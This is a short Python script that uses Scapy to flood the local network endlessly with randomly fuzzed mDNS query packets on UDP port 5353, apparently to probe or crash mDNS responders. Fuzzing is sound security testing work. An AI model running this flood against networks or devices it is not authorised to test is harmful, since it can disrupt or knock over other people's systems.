#!/usr/bin/python

from scapy import *


sendp(Ether(type=0x800, dst="ff:ff:ff:ff:ff:ff")/IP(dst="224.0.0.251")/fuzz(UDP(dport = 5353, sport = 5353)/DNS(qd = fuzz(DNSQR()))),loop=1, iface="realtek0")


